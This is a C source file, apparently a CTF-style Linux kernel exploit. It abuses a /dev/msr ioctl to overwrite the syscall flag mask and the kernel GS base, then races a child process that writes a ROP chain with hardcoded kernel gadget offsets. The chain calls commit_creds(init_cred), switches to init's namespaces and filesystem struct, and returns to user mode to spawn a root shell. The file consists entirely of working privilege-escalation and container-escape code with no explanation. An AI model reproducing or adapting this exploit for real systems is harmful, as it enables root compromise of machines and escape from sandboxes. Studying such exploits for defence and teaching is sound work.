// #define DBG
#include "kpwn.c"

#define MSR_SYSCALL_MASK 0xc0000084
#define MSR_KERNEL_GS_BASE 0xc0000101

#define EFLAGS_MASK 0x257fd5 ^ 0x40000
#define KERNEL_GS 0x10000
#define GS_SIZE 0x2d000

#define PHYS_GS 0x3ea00000

#define POP_RSP 0xfe760
#define POP_RDI 0xda228d
#define POP_RSI 0x2527cc
#define POP_RCX 0xa3e793
#define POP_RDX 0x67ad92

#define ADD_DWORD_RSIRDX1_ESI 0xaa4063
#define REP_MOVS_ALTERNATIVE 0x101ed10
#define PAGE_OFFSET_BASE 0x19ea178
#define WRMSR 0x1201886

#define INIT_CRED 0x1c501d0
#define COMMIT_CREDS 0xcd3b0
#define FIND_TASK_BY_VPID 0xbf9a0
#define MOV_QWORD_RDI_RAX REP_MOVS_ALTERNATIVE+3
#define INIT_NSPROXY 0x1c4fd10
#define SWITCH_TASK_NAMESPACES 0xca960
#define INIT_FS 0x1d71f20
#define COPY_FS_STRUCT 0x31e6b0
#define SWAPGS_AND_SHIT 0x12015d0 + 0x67


void win(){
    system("/bin/sh");
}

void naked_syscall(){
    asm volatile (
        ".intel_syntax noprefix\n"
        "mov rax, 0x6969\n"
        "syscall\n"
        ".att_syntax prefix\n"
        :
        :
        : "rax"
    );
}


int main(){
    pin_cpu(0);

    int fd = open("/dev/msr", O_RDONLY);
    char* kgsbase;
    char* fake_stack;
    ul* kbase;
    int parent_child = getpid();

    ul rsp;
    __asm__ volatile ("mov %%rsp, %0" : "=r"(rsp));

    stop("set eflags mask");
    ioctl(fd, MSR_SYSCALL_MASK, EFLAGS_MASK);

    stop("set fake kernel gs base");
    fake_stack = (char*) mmap(NULL, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    kgsbase = (char*) mmap((void* ) KERNEL_GS, GS_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    kbase = (ul*) mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

    int pid = fork();
    if (!pid){
        pin_cpu(1);
        memset(fake_stack, 0, 0x2000);
        memset(kbase, 0, 0x1000);
        memset(kgsbase, 0, GS_SIZE);

        *(ul*) &kgsbase[0x2be40] = (ul) kgsbase;
        *(ul*) &kgsbase[0x6004] = (ul) fake_stack + 0x1000;
        *(ul*) &kgsbase[0x2be58] = (ul) fake_stack + 0x1000;
        char* chain = fake_stack+0x1000;  


        *&kbase[1] = 1;
        while (!*kbase){}            // wait for parent to overwrite MSR_KERNEL_GS_BASE and leak kaslr

        // set correct gs
        *(ul*) &fake_stack[0x1000] = POP_RDI + *kbase;                       
        *(ul*) &fake_stack[0x1008] = (ul) &fake_stack[0x1068];
        *(ul*) &fake_stack[0x1010] = POP_RSI + *kbase;
        *(ul*) &fake_stack[0x1018] = PAGE_OFFSET_BASE + *kbase;
        *(ul*) &fake_stack[0x1020] = POP_RCX + *kbase; 
        *(ul*) &fake_stack[0x1028] = 8; 
        *(ul*) &fake_stack[0x1030] = REP_MOVS_ALTERNATIVE + *kbase; 
        *(ul*) &fake_stack[0x1038] = POP_RSI + *kbase; 
        *(ul*) &fake_stack[0x1040] = PHYS_GS; 
        *(ul*) &fake_stack[0x1048] = POP_RDX + *kbase; 
        *(ul*) &fake_stack[0x1050] = (ul) &fake_stack[0x1068] - PHYS_GS - 1;
        *(ul*) &fake_stack[0x1058] = ADD_DWORD_RSIRDX1_ESI + *kbase;
        *(ul*) &fake_stack[0x1060] = POP_RDX + *kbase; 
        *(ul*) &fake_stack[0x1068] = 0x6969696969696969; 
        *(ul*) &fake_stack[0x1070] = POP_RCX + *kbase; 
        *(ul*) &fake_stack[0x1078] = MSR_KERNEL_GS_BASE; 
        *(ul*) &fake_stack[0x1080] = WRMSR + *kbase; 

        // commit_creds(init_cred)
        *(ul*) &fake_stack[0x1088] = POP_RDI + *kbase; 
        *(ul*) &fake_stack[0x1090] = INIT_CRED + *kbase; 
        *(ul*) &fake_stack[0x1098] = COMMIT_CREDS + *kbase; 

        // task = find_task_by_vpid(1)
        *(ul*) &fake_stack[0x10a0] = POP_RDI + *kbase; 
        *(ul*) &fake_stack[0x10a8] = 1; 
        *(ul*) &fake_stack[0x10b0] = FIND_TASK_BY_VPID + *kbase;

        // switch_task_namespaces(task, init_nsproxy)
        *(ul*) &fake_stack[0x10b8] = POP_RDI + *kbase;
        *(ul*) &fake_stack[0x10c0] = (ul) &fake_stack[0x10e8];
        *(ul*) &fake_stack[0x10c8] = POP_RCX + *kbase;
        *(ul*) &fake_stack[0x10d0] = 8;
        *(ul*) &fake_stack[0x10d8] = MOV_QWORD_RDI_RAX + *kbase;
        *(ul*) &fake_stack[0x10e0] = POP_RDI + *kbase;
        *(ul*) &fake_stack[0x10e8] = 0x6969696969696969;
        *(ul*) &fake_stack[0x10f0] = POP_RSI + *kbase;
        *(ul*) &fake_stack[0x10f8] = INIT_NSPROXY + *kbase;
        *(ul*) &fake_stack[0x1100] = SWITCH_TASK_NAMESPACES + *kbase;

        // new_fs = copy_fs_struct(init_fs)
        *(ul*) &fake_stack[0x1108] = POP_RDI + *kbase;
        *(ul*) &fake_stack[0x1110] = INIT_FS + *kbase;
        *(ul*) &fake_stack[0x1118] = COPY_FS_STRUCT + *kbase;
        // save "somewhere" new_fs
        *(ul*) &fake_stack[0x1120] = POP_RDI + *kbase;
        *(ul*) &fake_stack[0x1128] = (ul) &fake_stack[0x1f00];
        *(ul*) &fake_stack[0x1130] = POP_RCX + *kbase;
        *(ul*) &fake_stack[0x1138] = 8;
        *(ul*) &fake_stack[0x1140] = MOV_QWORD_RDI_RAX + *kbase;

        // task = find_task_by_vpid(getpid())
        *(ul*) &fake_stack[0x1148] = POP_RDI + *kbase; 
        *(ul*) &fake_stack[0x1150] = (ul) parent_child; 
        *(ul*) &fake_stack[0x1158] = FIND_TASK_BY_VPID + *kbase;

        // current->fs = newfs
        *(ul*) &fake_stack[0x1160] = POP_RDI + *kbase;
        *(ul*) &fake_stack[0x1168] = (ul) &fake_stack[0x11b8];
        *(ul*) &fake_stack[0x1170] = POP_RCX + *kbase;
        *(ul*) &fake_stack[0x1178] = 8;
        *(ul*) &fake_stack[0x1180] = MOV_QWORD_RDI_RAX + *kbase;
        *(ul*) &fake_stack[0x1188] = POP_RSI + *kbase;
        *(ul*) &fake_stack[0x1190] = 0x760;
        *(ul*) &fake_stack[0x1198] = POP_RDX + *kbase; 
        *(ul*) &fake_stack[0x11a0] = (ul) &fake_stack[0x11b8] - 0x760 - 1;
        *(ul*) &fake_stack[0x11a8] = ADD_DWORD_RSIRDX1_ESI + *kbase;
        *(ul*) &fake_stack[0x11b0] = POP_RDI + *kbase;
        *(ul*) &fake_stack[0x11b8] = 0x6969696969696969;
        *(ul*) &fake_stack[0x11c0] = POP_RSI + *kbase;
        *(ul*) &fake_stack[0x11c8] = (ul) &fake_stack[0x1f00];
        *(ul*) &fake_stack[0x11d0] = POP_RCX + *kbase; 
        *(ul*) &fake_stack[0x11d8] = 8; 
        *(ul*) &fake_stack[0x11e0] = REP_MOVS_ALTERNATIVE + *kbase; 

        // ret2user
        *(ul*) &fake_stack[0x11e8] = SWAPGS_AND_SHIT + *kbase;
        *(ul*) &fake_stack[0x11f0] = 0;
        *(ul*) &fake_stack[0x11f8] = 0;
        *(ul*) &fake_stack[0x1200] = (ul) &win;
        *(ul*) &fake_stack[0x1208] = 0x33;
        *(ul*) &fake_stack[0x1210] = 0x206;
        *(ul*) &fake_stack[0x1218] = rsp;
        *(ul*) &fake_stack[0x1220] = 0x2b;

        while (1){
            *(ul*) &fake_stack[0xf50] = POP_RSP + *kbase;
            *(ul*) &fake_stack[0xf58] = (ul) chain;
        }; 

        return 0;
    }

    while (!*&kbase[1]){}                               // wait for child to fake gs

    asm volatile (
        ".intel_syntax noprefix\n"
        "push 0x40206\n"
        "popf\n"
        ".att_syntax prefix"
        :
        :
        :
    );  

    ioctl(fd, MSR_KERNEL_GS_BASE, KERNEL_GS);

    naked_syscall();
    *kbase = *(ul*) &fake_stack[0xf50] - 0x120012f;

    while (1) 
        naked_syscall();

    stop("finished");
    return 0;
}
